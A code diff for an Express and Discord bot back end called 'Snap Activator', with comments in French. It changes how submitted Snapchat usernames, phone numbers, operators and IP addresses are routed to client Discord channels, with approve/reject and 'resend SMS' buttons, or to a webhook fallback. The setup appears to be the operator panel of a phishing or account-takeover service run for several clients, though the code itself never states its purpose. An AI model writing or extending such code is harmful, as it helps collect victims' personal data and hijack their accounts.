@@ -618,39 +618,35 @@ app.post('/api/submit', async (req, res) => {
             new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
         );
 
-        const clientInfo = refGuildId ? ` (via lien client \`${refGuildId}\`)` : '';
+        const clientInfo = refGuildId ? ` (client \`${refGuildId}\`)` : '';
 
-        if (refGuildId && clientChannel) {
-            // Demande via lien client :
-            // - PRIORITY = info seulement (pas de boutons), pour monitoring
-            if (priorityChannel) {
-                const monitorEmbed = new EmbedBuilder()
-                    .setTitle('👁️ Nouvelle demande — monitoring')
-                    .setDescription(`> Gérée par le client \`${refGuildId}\``)
-                    .setColor(0xFF6600)
-                    .addFields(...baseFields)
-                    .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
-                    .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
-                    .setTimestamp();
-                try { await priorityChannel.send({ content: `🔔 Nouvelle demande${clientInfo}`, embeds: [monitorEmbed] }); }
-                catch(e) { console.error('Erreur envoi priority monitoring:', e.message); }
-            }
-            // - CLIENT channel = avec boutons approve/reject
-            try { await clientChannel.send({ embeds: [embed], components: [row] }); }
-            catch(e) { console.error('Erreur envoi channel client:', e.message); }
-        } else {
-            // Demande directe (pas de ref) : PRIORITY avec boutons, owner gère
-            if (priorityChannel) {
-                try {
-                    await priorityChannel.send({
-                        content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`,
-                        embeds: [embed],
-                        components: [row]
-                    });
-                } catch(e) { console.error('Erreur envoi priority:', e.message); }
+        // 1. PRIORITY — toujours info seulement, jamais de boutons
+        if (priorityChannel) {
+            const monitorEmbed = new EmbedBuilder()
+                .setTitle('👁️ Nouvelle demande — monitoring')
+                .setDescription(refGuildId ? `> Gérée par le client \`${refGuildId}\`` : '> Demande directe (sans ref)')
+                .setColor(0xFF6600)
+                .addFields(...baseFields)
+                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
+                .setTimestamp();
+            try { await priorityChannel.send({ content: `🔔 Nouvelle demande${clientInfo}`, embeds: [monitorEmbed] }); }
+            catch(e) { console.error('Erreur envoi priority monitoring:', e.message); }
+        }
+
+        // 2. Envoi avec boutons : channel client si ref, sinon fallback webhook
+        if (refGuildId) {
+            if (clientChannel) {
+                console.log(`[DISCORD] Envoi boutons → channel client ${refChannelId}`);
+                try { await clientChannel.send({ embeds: [embed], components: [row] }); }
+                catch(e) { console.error('Erreur envoi channel client:', e.message); }
             } else {
-                await sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ${ip}`);
+                console.error(`[DISCORD] Channel client ${refChannelId} introuvable — boutons perdus`);
+                await sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ref=${refGuildId} (channel introuvable)`);
             }
+        } else {
+            // Pas de ref : personne pour gérer les boutons, on envoie en webhook fallback
+            await sendWebhookFallback(`📱 Demande directe : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
         }
 
         console.log(`✅ Demande #${id} envoyée à Discord`);
